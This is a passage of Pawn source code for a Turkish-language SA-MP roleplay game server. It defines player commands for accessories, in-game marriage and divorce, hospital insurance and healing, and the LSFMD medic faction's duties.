	SendClientMessage(playerid, COLOR_GRAD3,"Oyuncak satýn almak için, herhangi bir kýyafet dükkanýna gidip {AA3333}/oyuncakal yaz");
	SendClientMessage(playerid, COLOR_GRAD3,"Oyuncak takýp çýkarmak, düzeltmek veya silmek için için, {AA3333}/oyuncaklar yaz");
	SendClientMessage(playerid, COLOR_GRAD3,"Hýzlýca oyuncaklarýný takmak için, {AA3333}/wat yaz");
	SendClientMessage(playerid, COLOR_GRAD3,"Hýzlýca oyuncaklarýný çýkarmak için, {AA3333}/dat yaz");
	return 1;
}

CMD:oyuncakal(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
		return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

	if(IsAtClothShop(playerid))
		ShowPlayerDialogEx(playerid, BUYTOYS, DIALOG_STYLE_MSGBOX, "Oyuncak Dükkaný", "Oyuncak dükkanýna hoþgeldin! Oyuncuna takmak için aksesuar satýn alabilirsin.\n\nIlk olarak, biz oyuncaðý depolamak için bir slot seçeceðiz.\n(Not: VIP olmayanlar 5 oyuncak alabilir, Yakut-Elmas VIP  6-8 oyuncak)","Devam", "Iptal");
	else
		SendClientMessage(playerid, COLOR_WHITE, "Kýyafet dükkanýnda deðilsin.");

	return 1;
}

CMD:oyuncaklistesi(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			iTargetID;

		if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /oyuncaklistesi [Oyuncu ID/Ýsim]");
		}
		else if(IsPlayerConnected(iTargetID)) for(new iToyIter, szMessage[128]; iToyIter < MAX_PLAYER_ATTOBJECTS; ++iToyIter) {
			for(new LoopRapist; LoopRapist < sizeof(HoldingObjectsAll); ++LoopRapist) {
				if(HoldingObjectsAll[LoopRapist][holdingmodelid] == PlayerToyInfo[iTargetID][iToyIter][ptModelID]) {
					format(szMessage, sizeof(szMessage), "%s (slot %i, Kemik: %s)", HoldingObjectsAll[LoopRapist][holdingmodelname], iToyIter, HoldingBones[PlayerToyInfo[iTargetID][iToyIter][ptBone]]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
					break;
				}
			}
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
	}
	return 1;
}

CMD:oyuncaklar(playerid, params[]) {
	if(PlayerCuffed[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");

	ShowPlayerDialogEx(playerid, TOYS, DIALOG_STYLE_LIST, "Oyuncak Menüsü", "Oyuncak Tak/Çýkar\nOyuncaðý Düzelt\nOyuncak Sil","Seç", "Iptal");
	return 1;
}

CMD:wat(playerid, params[]) {
	if(PlayerCuffed[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");

	SendClientMessage(playerid, COLOR_WHITE, "* Tüm oyuncaklar takýlý.");

	if(PlayerInfo[playerid][pDonator] <= 0)
	{
		for(new x;x<5;x++)
		{
			if(PlayerToyInfo[playerid][x][ptScaleX] == 0) {
				PlayerToyInfo[playerid][x][ptScaleX] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleY] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleZ] = 1.0;
			}
			if(PlayerToyInfo[playerid][x][ptModelID] != 0) SetPlayerAttachedObject(playerid, x, PlayerToyInfo[playerid][x][ptModelID], PlayerToyInfo[playerid][x][ptBone], PlayerToyInfo[playerid][x][ptPosX], PlayerToyInfo[playerid][x][ptPosY], PlayerToyInfo[playerid][x][ptPosZ], PlayerToyInfo[playerid][x][ptRotX], PlayerToyInfo[playerid][x][ptRotY], PlayerToyInfo[playerid][x][ptRotZ], PlayerToyInfo[playerid][x][ptScaleX], PlayerToyInfo[playerid][x][ptScaleY], PlayerToyInfo[playerid][x][ptScaleZ]);
		}
	}
	else if(PlayerInfo[playerid][pDonator] == 1)
	{
		for(new x;x<6;x++)
		{
			if(PlayerToyInfo[playerid][x][ptScaleX] == 0) {
				PlayerToyInfo[playerid][x][ptScaleX] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleY] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleZ] = 1.0;
			}
			if(PlayerToyInfo[playerid][x][ptModelID] != 0) SetPlayerAttachedObject(playerid, x, PlayerToyInfo[playerid][x][ptModelID], PlayerToyInfo[playerid][x][ptBone], PlayerToyInfo[playerid][x][ptPosX], PlayerToyInfo[playerid][x][ptPosY], PlayerToyInfo[playerid][x][ptPosZ], PlayerToyInfo[playerid][x][ptRotX], PlayerToyInfo[playerid][x][ptRotY], PlayerToyInfo[playerid][x][ptRotZ], PlayerToyInfo[playerid][x][ptScaleX], PlayerToyInfo[playerid][x][ptScaleY], PlayerToyInfo[playerid][x][ptScaleZ]);
		}
	}
	else if(PlayerInfo[playerid][pDonator] == 2)
	{
		for(new x;x<7;x++)
		{
			if(PlayerToyInfo[playerid][x][ptScaleX] == 0) {
				PlayerToyInfo[playerid][x][ptScaleX] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleY] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleZ] = 1.0;
			}
			if(PlayerToyInfo[playerid][x][ptModelID] != 0) SetPlayerAttachedObject(playerid, x, PlayerToyInfo[playerid][x][ptModelID], PlayerToyInfo[playerid][x][ptBone], PlayerToyInfo[playerid][x][ptPosX], PlayerToyInfo[playerid][x][ptPosY], PlayerToyInfo[playerid][x][ptPosZ], PlayerToyInfo[playerid][x][ptRotX], PlayerToyInfo[playerid][x][ptRotY], PlayerToyInfo[playerid][x][ptRotZ], PlayerToyInfo[playerid][x][ptScaleX], PlayerToyInfo[playerid][x][ptScaleY], PlayerToyInfo[playerid][x][ptScaleZ]);
		}
	}
	else if(PlayerInfo[playerid][pDonator] >= 3)
	{
		for(new x;x<8;x++)
		{
			if(PlayerToyInfo[playerid][x][ptScaleX] == 0) {
				PlayerToyInfo[playerid][x][ptScaleX] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleY] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleZ] = 1.0;
			}
			if(PlayerToyInfo[playerid][x][ptModelID] != 0) SetPlayerAttachedObject(playerid, x, PlayerToyInfo[playerid][x][ptModelID], PlayerToyInfo[playerid][x][ptBone], PlayerToyInfo[playerid][x][ptPosX], PlayerToyInfo[playerid][x][ptPosY], PlayerToyInfo[playerid][x][ptPosZ], PlayerToyInfo[playerid][x][ptRotX], PlayerToyInfo[playerid][x][ptRotY], PlayerToyInfo[playerid][x][ptRotZ], PlayerToyInfo[playerid][x][ptScaleX], PlayerToyInfo[playerid][x][ptScaleY], PlayerToyInfo[playerid][x][ptScaleZ]);
		}
	}
	return 1;
}

CMD:dat(playerid, params[]) {
	if(PlayerCuffed[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");

	SendClientMessage(playerid, COLOR_WHITE, "* Oyuncaklar çýkarýldý.");
	for(new x;x<MAX_PLAYERTOYS;x++)
	{
		RemovePlayerAttachedObject(playerid, x);
    }
    return 1;
}

CMD:bosan(playerid, params[])
{
	if(PlayerInfo[playerid][pMarried] < 1)
	{
		SendClientMessage(playerid, COLOR_GREY, "Evli deðilsin!");
		return 1;
	}

	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bosan [Oyuncu ID/Ýsim]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			new dstring[MAX_PLAYER_NAME];
			new wstring[MAX_PLAYER_NAME];
			new giveplayer[MAX_PLAYER_NAME];
			GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			format(string, sizeof(string), "%s", giveplayer);
			strmid(wstring, string, 0, strlen(string), 24);
			format(string, sizeof(string), "%s", PlayerInfo[playerid][pMarriedTo]);
			strmid(dstring, string, 0, strlen(string), 24);
			if(strcmp(dstring ,wstring, true) == 0)
			{
				format(string, sizeof(string), "* Boþanma evraklarýný %s kiþisine gönderdin.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* %s sana boþanma evraklarýný gönderdi (/kabulet bosanmak yazarak kabul et).", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				DivorceOffer[giveplayerid] = playerid;
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Oyuncu seninle evli deðil!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
			return 1;
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		return 1;
	}
}

CMD:adivorce(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] > 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /adivorce [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			ClearMarriage(giveplayerid);
			format(string, sizeof(string), "*%s kiþisinden admin olarak boþandýn.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* Admin tarafýndan admin olarak boþandýn.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			return 1;

		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
}

CMD:sahit(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /sahit [Oyuncu ID/Ýsim]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendine teklif edemezsin!"); return 1; }
			format(string, sizeof(string), "* %s kiþisine Nikah Þahitliði teklif ettin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* %s Nikah Þahidin olmayý teklif etti (kabul etmek için /kabulet sahitlik).", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			MarryWitnessOffer[giveplayerid] = playerid;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
			return 1;
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		return 1;
	}
	return 1;
}

CMD:evlilikteklifi(playerid, params[])
{
	new
		string[128],
		giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evlililkteklifi [Oyuncu ID/Ýsim]");

	if(IsPlayerConnected(giveplayerid)) {
		if(PlayerInfo[giveplayerid][pMarried] > 0)
			return SendClientMessage(playerid, COLOR_GREY, "   Bu oyuncu zaten evli!");

		if(GetPlayerCash(playerid) < 10000)
			return SendClientMessage(playerid, COLOR_GREY, "   Evlilik ve resepsiyon masraflarý $10000!");

		if(PlayerInfo[playerid][pMarried] > 0)
			return SendClientMessage(playerid, COLOR_GREY, "   Zaten evlisin!");

		if(MarryWitness[playerid] == giveplayerid)
			return SendClientMessage(playerid, COLOR_GREY, "   Þahitle evlenemezsin!");

		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_GREY, "Kendine teklif edemezsin!");

		if(ProxDetectorS(8.0, playerid, giveplayerid)) {
			format(string, sizeof(string), "* %s kiþisine teklif ettin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* %s sana teklif etti(kabul etmek için /kabulet evlilik).", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			ProposeOffer[giveplayerid] = playerid;
		} else return SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
	} else return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	return 1;
}

CMD:sigortaal(playerid, params[])
{
    if(IsPlayerInRangeOfPoint(playerid,2.0,1169.7209472656,-1348.3218994141,2423.0461425781) && PlayerInfo[playerid][pVW] == 1) {
        if(GetPlayerCash(playerid) >= 400) {
            if(PlayerInfo[playerid][pInsurance] != 1) {
                GivePlayerCash(playerid, -400);
                PlayerInfo[playerid][pInsurance] = 1;
                SendClientMessage(playerid, COLOR_WHITE, "   Sigorta alýndý,  $150 + Bir seferlik $250 transfer ücreti ödedin, Artýk $150 karþýlýðýnda All Saints Hastanesinde tedavi edileceksin.");
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GRAD4, "All Saints Hastanesinde zaten sigortan var!");
            }
        }
        else {
            SendClientMessage(playerid, COLOR_GRAD4, "Sigorta için yeterli paran yok!");
        }
    }
    else if(IsPlayerInRangeOfPoint(playerid,2.0,1169.7209472656,-1348.3218994141,2423.0461425781) && PlayerInfo[playerid][pVW] == 2) {
        if(GetPlayerCash(playerid) >= 400) {
            if(PlayerInfo[playerid][pInsurance] != 2) {
                GivePlayerCash(playerid, -400);
                PlayerInfo[playerid][pInsurance] = 2;
                SendClientMessage(playerid, COLOR_WHITE, "   Sigorta alýndý,  $150 + Bir seferlik $250 transfer ücreti ödedin, Artýk $150 karþýlýðýnda County General Hastanesinde tedavi edileceksin.");
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GRAD4, "County General Hastanesinde zaten sigortan var!");
            }
        }
        else {
            SendClientMessage(playerid, COLOR_GRAD4, "Sigorta için yeterli paran yok!");
        }
    }
    return 1;
}

CMD:sigortayardim(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    SendClientMessage(playerid, COLOR_WHITE,"*** INSURANCE HELP *** - daha çok bilgi için komut gir.");
    SendClientMessage(playerid, COLOR_GRAD3,"*** INSURANCE *** /sigortaal");
    SendClientMessage(playerid, COLOR_LIGHTRED,"*** INSURANCE *** ALL SAINTS: $150 + Transfer (Bir Seferlik) Fee of $250");
    SendClientMessage(playerid, COLOR_LIGHTRED,"*** INSURANCE *** COUNTY: $150 + Transfer (Bir Seferlik) Fee of $250");
    return 1;
}

CMD:fmdc(playerid, params[])
{
    new MemberString[1024], giveplayer[MAX_PLAYER_NAME], duty[10], string[128];
    if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 4)
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
			foreach(Player, i)
			{
			    giveplayer = GetPlayerNameEx(i);
				if(PlayerInfo[i][pFaction] == 3)
				{
				    switch(PlayerInfo[i][pDuty])
			    	{
      	 				case 0:
			        	{
			        	    duty = "Off Duty";
						}
						case 1:
						{
						    duty = "On Duty";
						}
			        }
					format(string, sizeof(string), "*(%s) - (Çaðrý Kabulü: %d) - (Teslim Edilen Hasta: %d) - (%s)\n", giveplayer, PlayerInfo[i][pCallsAccepted], PlayerInfo[i][pPatientsDelivered], duty);
					strcat(MemberString, string, sizeof(MemberString));
				}
			}
			if(strlen(MemberString) == 0)
			{
			    strcat(MemberString, "Online üye yok.", sizeof(MemberString));
			}
			ShowPlayerDialogEx(playerid, FMDC, DIALOG_STYLE_LIST, "FMVB - Giriþ Yapýlmýþ | LSFMD Üyeleri", MemberString, "Seç", "Iptal");
        }
        else SendClientMessage(playerid, COLOR_GREY, "Araçta deðilsin.");
    }
    return 1;
}

CMD:tedaviol(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 2.0, 1179.4012451172,-1331.5632324219,2423.0461425781))
	{
		if(GetPVarType(playerid, "STD"))
		{
			DeletePVar(playerid, "STD");
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Hastane yardýmý sayesinde STD mikrobu taþýmýyorsun!");
			GivePlayerCash(playerid, -100);
			SendClientMessage(playerid, TEAM_CYAN_COLOR, "Doktor: týbbi faturan $100. Iyi günler!");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Iyileþtirilecek STD mikrobun yok!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Hastanede deðilsin!");
	}
	return 1;
}

CMD:tedaviasfafa(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction]==3||PlayerInfo[playerid][pLeader]==3)//model
	{
 		if(PlayerInfo[playerid][pTriageTime] != 0)
   		{
     		SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanmak için 2 dakika beklemelisin.");
       		return 1;
	    }

	    new string[128], giveplayerid;
	    if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /tedavi [Oyuncu ID/Ýsim]");

   		if(IsPlayerConnected(giveplayerid))
   		{
    	    if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kendi üzerinde kullanamazsýn.");
    	    if(ProxDetectorS(5.0, playerid, giveplayerid))
			{
	    	    new Float: health;
	    	    GetPlayerHealth(giveplayerid, health);
	    	    if(health >= 85) SetPlayerHealth(giveplayerid, 100);
				else SetPlayerHealth(giveplayerid, health+15.0);
	    	    format(string, sizeof(string), "* %s, %s kiþisini iyileþtirdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
	    	    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				PlayerInfo[playerid][pTriageTime] = 120;
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
			}
 		}
	}
	return 1;
}

CMD:iyilestir(playerid, params[])
{
	if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "Etkinlikte iyileþtiremezsin!");

	new
		giveplayerid,
		price;

	if(sscanf(params, "ud", giveplayerid, price))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /iyilestir [Oyuncu ID/Ýsim] [fiyat]");

	if(price < 20 || price > 100)
		return SendClientMessage(playerid, COLOR_GREY, "Iyileþtirme ücreti $20-$100 arasý olmalý.");

	if(giveplayerid == playerid)
		return SendClientMessage(playerid, COLOR_GRAD1, "Kendini iyileþtiremezsin.");

	if(IsPlayerConnected(giveplayerid)) {
	    if(GetDistanceBetweenPlayers(giveplayerid, playerid) > 10)
	        return SendClientMessage(playerid, COLOR_GREY, "Hedefi iyileþtirmek için çok uzaktasýn.");

		if(PlayerInfo[giveplayerid][pCash] < price && price > 0)
		    return SendClientMessage(playerid, COLOR_GREY, "Iyileþtirme ücreti oyuncu için çok pahalý.");

		new
			iVehicle = GetPlayerVehicleID(playerid),
			iGiveVehicle = GetPlayerVehicleID(giveplayerid);

		if(IsInLSFMD(playerid)) {
			if(IsAnAmbulance(iVehicle) && iVehicle == iGiveVehicle) {
				new
					Float:tempheal;
				GetPlayerHealth(giveplayerid, tempheal);

				if(tempheal >= 100.0)
					return SendClientMessage(playerid, TEAM_GREEN_COLOR,"Bu oyuncu full canda.");

				new
					string[64];

				format(string, sizeof(string), "%s kiþisini $%d kadara iyileþtirdin.", GetPlayerNameEx(giveplayerid),price);
				SendClientMessage(playerid, COLOR_PINK, string);

				GivePlayerCash(playerid, price / 2);
				GivePlayerCash(giveplayerid, -price);
				SetPlayerHealth(giveplayerid, 100);
				PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);
				PlayerPlaySound(giveplayerid, 1150, 0.0, 0.0, 0.0);

				format(string, sizeof(string), " $%d karþýlýðýnda %s tarafýndan iyileþtirildin.",price, GetPlayerNameEx(playerid));
				Log("logs/iyilestir.log", string);
				SendClientMessage(giveplayerid, TEAM_GREEN_COLOR,string);

				if(GetPVarType(giveplayerid, "STD")) {
					DeletePVar(giveplayerid, "STD");
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "* Ilkyardim müdahalesi sayesinde STD mikrobu taþýmýyorsun.");
				}
			} else SendClientMessage(playerid, COLOR_GRAD1, "Hasta ve sen ikiniz de ambulansta olmanýz gerekiyor.");
		} else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	} else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	return 1;
}

CMD:lsfmd(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3,1188.5157470703,-1350.9741210938, 2423.2648925781) || IsPlayerInRangeOfPoint(playerid,3,190.006759, 166.887557, 1997.859375))
		{
			ShowPlayerDialogEx(playerid, LSFMDMENU, DIALOG_STYLE_LIST, "LSFMD","Ýþbaþý\nUniforma\nEkipman\nSivil", "Seç", "Iptal");
		}
		else
		{
			SendClientMessage(playerid, COLOR_RED, "LSFMD dolaplarýndan uzaktasýn.");
		}
	}
	return 1;
}

CMD:lsfmdbirim(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 5) {
		new
			string[128],
			giveplayerid,
			division;

		if(sscanf(params, "ud", giveplayerid, division)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /lsfmdbirim [Oyuncu ID/Ýsim] [division]");
			SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Birim Isimleri: 0 (None), 1 (T&R), 2 (LF), 3 (FD), 4 (I&A)");
			return 1;
		}

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pFaction] == 3) {
				if(division == 0) {
					PlayerInfo[giveplayerid][pDivision] = 0;
					format(string, sizeof(string), "Biriminden %s tarafýndan atýldýn.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "%s adlý kiþiyi birimden attýn.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				} else if(division == 1) {
					PlayerInfo[giveplayerid][pDivision] = 1;
					format(string, sizeof(string), "Þu an Eðitim & Ýþe Alma birimindesin, Davet Eden: %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "%s adlý kiþiyi Eðitim & Ýþe Alma birimine davet ettin.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				} else if(division == 2) {
					PlayerInfo[giveplayerid][pDivision] = 2;
					format(string, sizeof(string), "Hayat Uçuþu birimindesin, Davet Eden: %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "%s adlý kiþiyi Hayat Uçuþu birimine davet ettin.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				} else if(division == 3) {
					PlayerInfo[giveplayerid][pDivision] = 3;
					format(string, sizeof(string), "Yangýn Departmaný birimindesin, Davet Eden: %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "%s adlý kiþiyi Yangýn Departmaný birimine davet ettin.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                } else if(division == 4) {
					PlayerInfo[giveplayerid][pDivision] = 4;
					format(string, sizeof(string), "Ýnternal Affairs birimindesin, Davet Eden: %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "%s adlý kiþiyi Ýnternal Affairs birimine davet ettin.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				} else cmd_lsfmdbirim(playerid, "");
			} else SendClientMessage(playerid, COLOR_GRAD1, "Seçtiðin oyuncu sizin kuruluþta deðil.");
		} else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	} else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkin yok - LSFMD R5+ kiþiler kullanabilir.");
	return 1;
}

CMD:ykabul(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ykabul(patient) [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
		    if(giveplayerid == playerid)
		    {
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Kendi ilkyardým çaðrýný kabul edemezsin!");
				return 1;
		    }
			if(GetPVarInt(giveplayerid,"MedicCall") == 1)
			{
				if(PlayerInfo[giveplayerid][pJailed] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this command on jailed players.");
				format(string, sizeof(string), "Ilkyardým þoförü %s (%d) %s kiþisinin ilkyardým çaðrýsýný kabul etti.",GetPlayerNameEx(playerid),giveplayerid,GetPlayerNameEx(giveplayerid));
				SendRadioMessage(3, TEAM_MED_COLOR, string);
				format(string, sizeof(string), "* %s adlý kiþinin ilkyardým çaðrýsýný kabul ettin, ulaþana kadar iþareti göreceksin.",GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Ilkyardým þoförü %s ilkyardým çaðrýný kabul etti; bulunduðun noktada bekle.",GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				GameTextForPlayer(playerid, "~w~Ilkyardým çaðrýsý~n~~r~Kýrmýzý iþarete git.", 5000, 1);
				EMSCallTime[playerid] = 1;
				EMSAccepted[playerid] = giveplayerid;
				SetPVarInt(giveplayerid, "EMSAttempt", 1);
				SetPVarInt(giveplayerid, "EMSWaiting", playerid);
				PlayerInfo[playerid][pCallsAccepted]++;
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "Oyuncu ilkyardým istememiþ!");
			}
		}
	}
	return 1;
}

CMD:yaralilistesi(playerid, params[]) {
    if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3) {
        new
            szPlayerZone[MAX_ZONE_NAME],
            szMessage[128],
            Float:health,
			iCount;

        SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastalar müdahale bekliyor:");

        foreach(Player, i) {
            if(GetPVarInt(i, "Injured") == 1) {
                GetPlayerHealth(i,health);
                GetPlayer3DZone(i, szPlayerZone, MAX_ZONE_NAME);
				foreach(Player, j) {
					if(EMSAccepted[j] == i) {
						format(szMessage, sizeof(szMessage), "%s (ID: %d) - (bölge: %s) - kalan can: %.1f - Kabul Edildi: %s", GetPlayerNameEx(i), i, szPlayerZone, health, GetPlayerNameEx(j));
						SendClientMessage(playerid, COLOR_WHITE, szMessage);
						iCount ++;
					}
				}
				if(iCount == 0) {
					format(szMessage, sizeof(szMessage), "%s (ID: %d) - (bölge: %s) - kalan can: %.1f ", GetPlayerNameEx(i), i, szPlayerZone, health);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
				}
            }
        }
    }
	return 1;
}

CMD:ytasi(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ytasi [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(GetPVarInt(giveplayerid,"Injured") == 1)
			{
				if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "Araçtayken bu komutu kullanamazsýn.");
				if(PlayerInfo[giveplayerid][pJailed] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu hapisteki oyuncular için kullanamazsýn.");
				if(GetPVarInt(giveplayerid, "OnStretcher") == 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Oyuncu zaten sedyede, þu an bunu yapamazsýn!");
					return 1;
				}

				new Float:mX, Float:mY, Float:mZ;
				GetPlayerPos(giveplayerid, mX, mY, mZ);
				if(!IsPlayerInRangeOfPoint(playerid, 5.0, mX, mY, mZ))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Hastayý taþýmak için yanýnda olmalýsýn!");
					return 1;
				}
				SendClientMessage(playerid, COLOR_GRAD2, "Baþka bir noktaya götürmek için 30 saniyen var ya da '{AA3333}FIRE{BFC0C2}' düðmesine basabilirsin.");
				format(string, sizeof(string), "* %s tarafýndan sedyeye yatýrýldýn.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
